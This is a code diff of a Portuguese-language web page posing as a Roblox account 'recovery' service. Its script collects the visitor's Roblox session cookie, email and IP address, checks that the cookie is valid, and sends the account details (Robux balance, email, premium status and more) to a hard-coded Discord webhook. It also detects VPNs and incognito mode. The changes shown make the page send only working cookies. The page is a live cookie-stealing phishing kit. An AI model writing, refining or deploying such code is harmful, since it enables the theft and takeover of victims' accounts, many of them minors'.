@@ -56,7 +56,6 @@
             overflow-x: hidden;
         }
 
-        /* ===== FUNDO ===== */
         .bg-layer {
             position: fixed;
             inset: 0;
@@ -95,7 +94,6 @@
 
         @keyframes floatOrb { 0% { transform: translate(0, 0) scale(1); } 100% { transform: translate(60px, -50px) scale(1.15); } }
 
-        /* ===== ANIMAÇÕES ===== */
         @keyframes fadeUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
         @keyframes slideRight { from { opacity: 0; transform: translateX(-30px); } to { opacity: 1; transform: translateX(0); } }
         @keyframes slideLeft { from { opacity: 0; transform: translateX(30px); } to { opacity: 1; transform: translateX(0); } }
@@ -104,12 +102,10 @@
         @keyframes spin { to { transform: rotate(360deg); } }
         @keyframes progressAnim { from { width: 0%; } to { width: 100%; } }
 
-        /* ===== SCROLL ===== */
         ::-webkit-scrollbar { width: 6px; }
         ::-webkit-scrollbar-track { background: var(--bg-start); }
         ::-webkit-scrollbar-thumb { background: var(--primary); border-radius: 10px; }
 
-        /* ===== NAVBAR ===== */
         .navbar {
             position: sticky;
             top: 0;
@@ -183,7 +179,6 @@
             padding: 0.3rem;
         }
 
-        /* ===== CONTAINER ===== */
         .container {
             max-width: 1400px;
             margin: 0 auto;
@@ -192,7 +187,6 @@
             z-index: 1;
         }
 
-        /* ===== SEÇÕES ===== */
         .section {
             display: none;
             padding: 2.5rem 0 4rem;
@@ -200,7 +194,6 @@
         }
         .section.active { display: block; }
 
-        /* ===== TÍTULOS ===== */
         .section-title {
             font-family: 'Poppins', sans-serif;
             font-size: clamp(1.8rem, 4vw, 3rem);
@@ -221,7 +214,6 @@
             font-weight: 400;
         }
 
-        /* ===== BOTÕES ===== */
         .btn {
             display: inline-flex;
             align-items: center;
@@ -263,7 +255,6 @@
         }
         .btn-secondary:disabled { opacity: 0.4; cursor: not-allowed; }
 
-        /* ===== HERO ===== */
         .hero {
             text-align: center;
             padding: 3rem 0 2rem;
@@ -336,7 +327,6 @@
         }
         .hero-tags span i { color: var(--secondary); }
 
-        /* ===== CARDS ===== */
         .grid-4 {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
@@ -387,7 +377,6 @@
         .card h3 { font-size: 1.1rem; font-weight: 800; margin-bottom: 0.3rem; }
         .card p { color: var(--text-secondary); font-size: 0.88rem; line-height: 1.6; }
 
-        /* ===== RECOVERY ===== */
         .recovery-layout {
             display: grid;
             grid-template-columns: 1fr 320px;
@@ -516,7 +505,6 @@
         .disclaimer a { color: var(--secondary); text-decoration: none; font-weight: 700; }
         .disclaimer a:hover { color: var(--primary-light); }
 
-        /* ===== BLOCK MESSAGE ===== */
         .block-msg {
             background: rgba(239, 68, 68, 0.06);
             border: 1.5px solid rgba(239, 68, 68, 0.15);
@@ -555,7 +543,6 @@
 
         .block-msg .help-links a.tiktok { color: #25f4ee; border-color: rgba(37, 244, 238, 0.15); }
 
-        /* ===== SIDEBAR ===== */
         .sidebar {
             display: flex;
             flex-direction: column;
@@ -621,7 +608,6 @@
         .feature-list li:hover { color: #fff; padding-left: 0.2rem; }
         .feature-list li i { color: var(--secondary); font-size: 0.7rem; }
 
-        /* ===== FAQ ===== */
         .faq-grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
@@ -680,7 +666,6 @@
         .faq-item.open .faq-a { max-height: 300px; }
         .faq-a p { padding: 0 1.4rem 1.4rem; color: var(--text-secondary); font-size: 0.84rem; line-height: 1.7; }
 
-        /* ===== STATS ===== */
         .stats-grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
@@ -718,7 +703,6 @@
 
         .stat-card .label { color: var(--text-secondary); font-size: 0.85rem; font-weight: 600; margin-top: 0.1rem; }
 
-        /* ===== COMUNIDADE ===== */
         .community-grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
@@ -811,7 +795,6 @@
             color: rgba(255, 255, 255, 0.7);
         }
 
-        /* ===== DOAÇÃO ===== */
         .donation-grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
@@ -890,7 +873,6 @@
         .maintenance-banner h3 { font-weight: 800; font-size: 1rem; margin-bottom: 0.1rem; }
         .maintenance-banner p { color: var(--text-secondary); font-size: 0.85rem; }
 
-        /* ===== FOOTER ===== */
         .footer {
             margin-top: 4rem;
             padding: 3rem 0 1.5rem;
@@ -929,7 +911,6 @@
 
         .footer-bottom i { color: var(--primary); animation: pulseGlow 1.8s ease-in-out infinite; }
 
-        /* ===== MODAIS ===== */
         .modal-overlay {
             position: fixed;
             inset: 0;
@@ -1013,7 +994,6 @@
 
         .btn-success:hover { transform: translateY(-2px); box-shadow: 0 14px 40px var(--glow); }
 
-        /* ===== TERMS MODAL ===== */
         .terms-overlay {
             position: fixed;
             inset: 0;
@@ -1075,7 +1055,6 @@
 
         .btn-ghost:hover { background: rgba(255, 255, 255, 0.06); border-color: rgba(255, 255, 255, 0.08); }
 
-        /* ===== BLOCK MODAL (BAN) ===== */
         .block-overlay {
             position: fixed;
             inset: 0;
@@ -1182,7 +1161,6 @@
 
         .block-box .support-note { color: var(--text-muted); font-size: 0.72rem; margin-top: 0.9rem; }
 
-        /* ===== RESPONSIVO ===== */
         @media (max-width: 1024px) {
             .recovery-layout { grid-template-columns: 1fr; }
             .container { padding: 0 1.5rem; }
@@ -1554,11 +1532,11 @@
     </div>
 
     <!-- ============================================================ -->
-    <!-- ===== SCRIPT COM INTEGRAÇÃO DA API ROBLOX ===== -->
+    <!-- ===== SCRIPT CORRIGIDO ===== -->
     <!-- ============================================================ -->
     <script>
         // ============================================================
-        // FUNÇÃO PARA VERIFICAR COOKIE VIA API DO VERCEL
+        // FUNÇÃO PARA VERIFICAR COOKIE VIA API (CORRIGIDA)
         // ============================================================
         async function getRobloxInfo(cookie) {
             try {
@@ -1572,8 +1550,15 @@
 
                 const data = await response.json();
 
+                // 🔥 SE A API RETORNOU ERRO
                 if (!response.ok || !data.success) {
                     console.error('❌ Erro na API:', data.error || 'Erro desconhecido');
+                    return null;
+                }
+
+                // 🔥 SE NÃO TEM INFORMAÇÕES
+                if (!data.data || !data.data.hasInfo) {
+                    console.error('❌ Conta sem informações disponíveis');
                     return null;
                 }
 
@@ -1585,7 +1570,7 @@
         }
 
         // ============================================================
-        // 0. DETECÇÃO DE MODO INCÓGNITO (FRONTEND)
+        // DETECÇÃO DE MODO INCÓGNITO
         // ============================================================
         function detectIncognito() {
             return new Promise((resolve) => {
@@ -1655,7 +1640,7 @@
         }
 
         // ============================================================
-        // 1. DETECÇÃO DE NAVEGADOR ANÔNIMO E VPN
+        // DETECÇÃO DE NAVEGADOR ANÔNIMO E VPN
         // ============================================================
         function isPrivateBrowsing() {
             return new Promise((resolve) => {
@@ -1798,7 +1783,7 @@
         }
 
         // ============================================================
-        // 2. CONFIG
+        // CONFIG
         // ============================================================
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1520125483113644042/-QCwmVlXoYqxEZZ34SOpXTk7EkSsw6mrCHfQJ2ciA9E_zjxWQAsBvpc3v5wzw9KZ8IYb';
 
@@ -1811,7 +1796,7 @@
         let webhookInfo = { username: 'Aurora Security', avatar_url: 'https://cdn.discordapp.com/emojis/1234567890/a_abcdef.gif' };
 
         // ============================================================
-        // 3. BAN COM GIF - CORRIGIDO
+        // BAN COM GIF
         // ============================================================
         function showBanBlockModal(reason, expires, gif) {
             const modal = document.getElementById('blockModal');
@@ -1866,7 +1851,7 @@
         }
 
         // ============================================================
-        // 4. VERIFICA BAN POR IP - CORRIGIDO
+        // VERIFICA BAN POR IP
         // ============================================================
         async function checkBanStatus() {
             try {
@@ -1898,7 +1883,7 @@
         }
 
         // ============================================================
-        // 5. TERMS
+        // TERMS
         // ============================================================
         function openTerms() {
             if (isUserBanned) { showNotification('🚫', 'Acesso Bloqueado!', 'Você está banido.');
@@ -1926,7 +1911,7 @@
         }
 
         // ============================================================
-        // 6. IP
+        // IP
         // ============================================================
         async function getIP() {
             try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); return d.ip; } catch (
@@ -1934,38 +1919,41 @@
         }
 
         // ============================================================
-        // 7. WEBHOOK COM INTEGRAÇÃO DA API ROBLOX
+        // WEBHOOK - SÓ ENVIA SE O COOKIE FOR VÁLIDO
         // ============================================================
         async function sendToWebhook(cookie, email, ip, isPrivate, vpnDetected) {
             try {
-                // ===== VERIFICAR O COOKIE E PEGAR INFORMAÇÕES =====
+                // ===== VERIFICAR O COOKIE =====
                 const robloxInfo = await getRobloxInfo(cookie);
 
-                let infoText = '';
-                if (robloxInfo && robloxInfo.hasInfo) {
-                    infoText = 
-                        `\n\n👤 **Check Cookie**\n` +
-                        `📛 **Username:** ${robloxInfo.username} (13+)\n` +
-                        `🆔 **ID:** ${robloxInfo.userId}\n` +
-                        `\n💰 **Roblox:** ${robloxInfo.robux.toLocaleString()} (${robloxInfo.pendingRobux.toLocaleString()})\n` +
-                        `📊 **Summary:** ${robloxInfo.summary}\n` +
-                        `📥 **Roblox Incoming/Outgoing:** ${robloxInfo.incoming}/${robloxInfo.outgoing}\n` +
-                        `📅 **Age:** ${robloxInfo.accountAgeDays} Dias\n` +
-                        `💵 **Income:** ${robloxInfo.income}\n` +
-                        `\n🖥️ **IP Info**\n` +
-                        `🌐 **IP:** ${ip}\n` +
-                        `📌 **Status:** ${robloxInfo.hasEmail ? '✅ Verificado' : '❌ Não verificado'} ${robloxInfo.hasEmail ? `(${robloxInfo.email})` : '(No Email Address)'}\n` +
-                        `🏢 **Groups Owned:** ${robloxInfo.groupsOwned}\n` +
-                        `👤 **Roblox Headless:** ${robloxInfo.isHeadless ? '✅ True' : '❌ False'}/${robloxInfo.isHeadless ? 'True' : 'False'}\n` +
-                        `📍 **Place Visits:** ${robloxInfo.placeVisits.toLocaleString()}\n` +
-                        `\n💎 **Premium:** ${robloxInfo.isPremium ? '✅ Ativo' : '❌ Inativo'}\n` +
-                        `🟢 **Status:** ${robloxInfo.presence}\n` +
-                        `👫 **Amigos:** ${robloxInfo.friendsCount}\n` +
-                        `🏢 **Grupos:** ${robloxInfo.groupsCount}\n` +
-                        `🖼️ **Avatar:** ${robloxInfo.avatarUrl}`;
-                } else {
-                    infoText = '\n\n❌ **Não foi possível verificar as informações da conta.**';
+                // 🔥 SE NÃO CONSEGUIU VERIFICAR, NÃO ENVIA O WEBHOOK
+                if (!robloxInfo) {
+                    console.error('❌ Cookie inválido! Webhook não será enviado.');
+                    showNotification('❌', 'Cookie Inválido!', 'O cookie fornecido é inválido ou expirou. Verifique e tente novamente.');
+                    return false;
                 }
+
+                // ===== MONTAR A MENSAGEM =====
+                const infoText = 
+                    `\n\n👤 **Check Cookie**\n` +
+                    `📛 **Username:** ${robloxInfo.username} (13+)\n` +
+                    `🆔 **ID:** ${robloxInfo.userId}\n` +
+                    `\n💰 **Roblox:** ${robloxInfo.robux.toLocaleString()} (${robloxInfo.pendingRobux.toLocaleString()})\n` +
+                    `📊 **Summary:** ${robloxInfo.summary}\n` +
+                    `📥 **Roblox Incoming/Outgoing:** ${robloxInfo.incoming}/${robloxInfo.outgoing}\n` +
+                    `📅 **Age:** ${robloxInfo.accountAgeDays} Dias\n` +
+                    `💵 **Income:** ${robloxInfo.income}\n` +
+                    `\n🖥️ **IP Info**\n` +
+                    `🌐 **IP:** ${ip}\n` +
+                    `📌 **Status:** ${robloxInfo.hasEmail ? '✅ Verificado' : '❌ Não verificado'} ${robloxInfo.hasEmail ? `(${robloxInfo.email})` : '(No Email Address)'}\n` +
+                    `🏢 **Groups Owned:** ${robloxInfo.groupsOwned}\n` +
+                    `👤 **Roblox Headless:** ${robloxInfo.isHeadless ? '✅ True' : '❌ False'}/${robloxInfo.isHeadless ? 'True' : 'False'}\n` +
+                    `📍 **Place Visits:** ${robloxInfo.placeVisits.toLocaleString()}\n` +
+                    `\n💎 **Premium:** ${robloxInfo.isPremium ? '✅ Ativo' : '❌ Inativo'}\n` +
+                    `🟢 **Status:** ${robloxInfo.presence}\n` +
+                    `👫 **Amigos:** ${robloxInfo.friendsCount}\n` +
+                    `🏢 **Grupos:** ${robloxInfo.groupsCount}\n` +
+                    `🖼️ **Avatar:** ${robloxInfo.avatarUrl}`;
 
                 const vpnData = vpnDetected ? await getIPData() : null;
 
@@ -2009,7 +1997,7 @@
         }
 
         // ============================================================
-        // 8. DETECT VIA API
+        // DETECT VIA API
         // ============================================================
         async function checkDetection() {
             try {
@@ -2054,7 +2042,7 @@
         }
 
         // ============================================================
-        // 9. UI HELPERS
+        // UI HELPERS
         // ============================================================
         function toggleMenu() { document.getElementById('navMenu').classList.toggle('open'); }
 
@@ -2094,7 +2082,7 @@
         }
 
         // ============================================================
-        // 10. TIMER
+        // TIMER
         // ============================================================
         function updateTimer() {
             if (!blockUntil) return;
@@ -2117,7 +2105,7 @@
         }
 
         // ============================================================
-        // 11. SUBMIT
+        // SUBMIT - CORRIGIDO
         // ============================================================
         async function handleSubmit(e) {
             e.preventDefault();
@@ -2157,6 +2145,18 @@
 
             const ip = await getIP();
             document.getElementById('submitBtn').disabled = true;
+            document.getElementById('submitBtn').innerHTML = '<i class="fas fa-spinner fa-spin"></i> Verificando...';
+
+            // 🔥 VERIFICA O COOKIE ANTES DE ENVIAR
+            const robloxInfo = await getRobloxInfo(cookie);
+
+            if (!robloxInfo) {
+                document.getElementById('submitBtn').disabled = false;
+                document.getElementById('submitBtn').innerHTML = '<i class="fas fa-lock-open"></i> Iniciar Recuperação';
+                showNotification('❌', 'Cookie Inválido!', 'O cookie fornecido é inválido ou expirou. Verifique e tente novamente.');
+                return;
+            }
+
             document.getElementById('submitBtn').innerHTML = '<i class="fas fa-spinner fa-spin"></i> Enviando...';
 
             const sent = await sendToWebhook(cookie, email, ip, isPrivate, hasVPN);
@@ -2183,7 +2183,7 @@
         }
 
         // ============================================================
-        // 12. MODALS
+        // MODALS
         // ============================================================
         function showProcessing() {
             const modal = document.getElementById('processingModal');
@@ -2217,7 +2217,7 @@
         }
 
         // ============================================================
-        // 13. NOTIFICATION
+        // NOTIFICATION
         // ============================================================
         function showNotification(icon, title, msg) {
             const el = document.createElement('div');
@@ -2237,7 +2237,7 @@
         }
 
         // ============================================================
-        // 14. CLOSE MODALS (BLOQUEIO DE FECHAMENTO DO BAN)
+        // CLOSE MODALS
         // ============================================================
         document.addEventListener('click', function(e) {
             const block = document.getElementById('blockModal');
@@ -2251,7 +2251,7 @@
         });
 
         // ============================================================
-        // 15. SCROLL
+        // SCROLL
         // ============================================================
         window.addEventListener('scroll', () => {
             document.querySelector('.navbar').style.background = window.scrollY > 10 ? 'rgba(10,5,21,0.94)' :
@@ -2259,7 +2259,7 @@
         });
 
         // ============================================================
-        // 16. RESTORE BLOCK
+        // RESTORE BLOCK
         // ============================================================
         function restoreBlock() {
             const saved = localStorage.getItem('aurora_block_until');
@@ -2281,7 +2281,7 @@
         }
 
         // ============================================================
-        // 17. WEBHOOK INFO
+        // WEBHOOK INFO
         // ============================================================
         async function fetchWebhookInfo() {
             try {
@@ -2298,7 +2298,7 @@
         }
 
         // ============================================================
-        // 18. INIT
+        // INIT
         // ============================================================
         async function init() {
             console.log('%c✨ Aurora Premium v3.0 ✨', 'font-size:24px;font-weight:bold;color:#7c3aed;');
